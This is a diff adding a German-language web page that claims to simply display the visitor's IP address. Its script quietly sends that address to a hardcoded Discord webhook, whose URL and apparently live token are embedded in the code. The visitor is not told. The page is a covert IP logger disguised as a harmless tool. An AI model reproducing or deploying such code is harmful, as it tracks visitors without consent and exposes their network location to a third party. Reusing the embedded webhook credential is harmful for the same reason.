@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP-Adresse anzeigen</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+
+        #ip-display {
+            font-size: 2em;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="ip-display">IP-Adresse wird geladen...</div>
+
+    <script>
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1277935306787651614/EEvAG-Zgj3e3Lju7xXTnO-W7uM9PBW8sjRY5Q7G1WXOLrlwEFEjFnpy2Rh1U7RkNr2f-'; // Hier die Discord Webhook-URL einfügen
+
+        // Funktion zum Senden einer Nachricht an den Discord Webhook
+        function sendToDiscord(ip) {
+            const message = {
+                content: `Die IP-Adresse des Benutzers ist: ${ip}`
+            };
+
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP-Adresse erfolgreich an Discord gesendet');
+                } else {
+                    console.error('Fehler beim Senden an Discord');
+                }
+            })
+            .catch(error => {
+                console.error('Fehler:', error);
+            });
+        }
+
+        // Abrufen der externen IP-Adresse über die ipify API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+                document.getElementById('ip-display').textContent = 'Ihre IP-Adresse ist: ' + userIP;
+                sendToDiscord(userIP); // IP-Adresse an Discord senden
+            })
+            .catch(error => {
+                document.getElementById('ip-display').textContent = 'Fehler beim Abrufen der IP-Adresse';
+                console.error('Fehler:', error);
+            });
+    </script>
+
+</body>
+</html>
